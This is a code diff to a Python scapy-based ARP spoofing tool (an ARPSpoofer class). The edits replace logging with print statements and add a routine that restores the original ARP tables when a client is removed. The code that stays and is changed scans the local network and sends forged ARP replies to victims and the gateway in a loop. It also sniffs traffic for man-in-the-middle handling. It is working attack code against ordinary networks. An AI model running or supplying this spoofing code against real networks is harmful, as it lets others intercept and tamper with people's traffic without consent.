@@ -2,11 +2,8 @@ import random
 from scapy.all import *
 from scapy.layers.l2 import ARP, Ether
 import netifaces
-from logging import getLogger
 import time
 # from scapy.layers.inet import IP, ICMP
-
-logger = getLogger(__name__)
 
 
 class ARPSpoofer:
@@ -35,7 +32,7 @@ class ARPSpoofer:
                     break
 
             network_ip = self.gateway_ip + "/" + str(host_bits)
-            logger.debug(f"Running scan on network address: {network_ip}")
+            print(f"Running scan on network address: {network_ip}")
 
             arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network_ip)
 
@@ -43,9 +40,10 @@ class ARPSpoofer:
             arp_responses = {}
             for _, received in result:
                 arp_responses[received.psrc] = received.hwsrc
-            logger.debug("IP\t\tMAC")
+
+            print("IP\t\tMAC")
             for client in arp_responses.keys():
-                logger.debug(f'{client}\t{arp_responses[client]}')
+                print(f'{client}\t{arp_responses[client]}')
             return arp_responses
         elif scanning_method == 'nmap':
             pass
@@ -75,18 +73,30 @@ class ARPSpoofer:
         self.spoofing_clients.append(
             {"original_IP": client_ip, "original_MAC": response.hwsrc, "attack_type": attack_type}
         )
-        logger.debug("Client added to spoofed_clients list")
+        print("Client added to spoofed_clients list")
+
+    def _create_and_send_original_packets(self, client):
+        print("Creating and sending packets for restoring original IP-MAC")
+        client_packet = Ether(dst=ETHER_BROADCAST, src=client['original_MAC']) / ARP(
+            pdst=client['original_IP'], psrc=self.gateway_ip
+        )
+        sendp(client_packet, verbose=False)
+        gateway_packet = Ether(dst=ETHER_BROADCAST, src=self.gateway_mac) / ARP(
+            pdst=self.gateway_ip, psrc=client['original_IP']
+        )
+        sendp(gateway_packet, verbose=False)
+        print(f"Packets sent: {[client_packet.summary(), gateway_packet.summary()]}")
 
     def remove_spoof_client(self, client_ip):
         for client in self.spoofing_clients:
             if client['original_IP'] == client_ip:
                 self.spoofing_clients.remove(client)
-                logger.debug("Client removed from spoofing clients list")
+                self._create_and_send_original_packets(client)
+                print("Client removed from spoofing clients list")
                 break
-        logger.debug("Didn't found client with given ip in spoofed clients list")
 
-    def _create_and_send_spoofed_packets(self, client, spoof_source=False):
-        logger.debug("Creating and sending packets for spoofing")
+    def _create_and_send_spoofed_packets(self, client, spoof_source):
+        print("Creating and sending packets for spoofing")
         client_ip = client['original_IP']
         client_mac = client['original_MAC']
 
@@ -104,12 +114,12 @@ class ARPSpoofer:
             pdst=self.gateway_ip, psrc=client_ip
         )
         sendp(gateway_packet, verbose=False)
-        logger.debug(f"Packets sent: {[client_packet.summary(), gateway_packet.summary()]}")
+        print(f"Packets sent: {[client_packet.show(), gateway_packet.show()]}")
 
     def spoofing_func(self, spoof_source=False):
-        logger.debug("Spoofing these clients")
-        logger.debug(self.spoofing_clients)
         while True:
+            print("Spoofing these clients")
+            print(self.spoofing_clients)
             for client in self.spoofing_clients:
                 self._create_and_send_spoofed_packets(client, spoof_source)                
             time.sleep(2)
@@ -119,26 +129,6 @@ class ARPSpoofer:
     def mitm_func(self):
         sniff(prn = self.mitm_packet_handler)
 
-    # def _create_original_packets(self, client_ip, client_mac):
-    #     logger.debug("Creating packets for restoring original IP-MAC")
-
-    #     gateway_ip = self.gateway_ip
-    #     gateway_mac = self.gateway_mac
-
-    #     packets = []
-    #     client_packet = Ether(dst=ETHER_BROADCAST, src=client_mac) / ARP(
-    #         pdst=client_ip, psrc=gateway_ip
-    #     )
-    #     gateway_packet = Ether(dst=ETHER_BROADCAST, src=gateway_mac) / ARP(
-    #         pdst=gateway_ip, psrc=client_ip
-    #     )
-
-    #     packets.append(client_packet)
-    #     packets.append(gateway_packet)
-
-    #     logger.debug(f"Packets generated: {packets}")
-
-    #     return packets
 
 
 # packets = self._create_original_packets(client['IP'],client['MAC'])
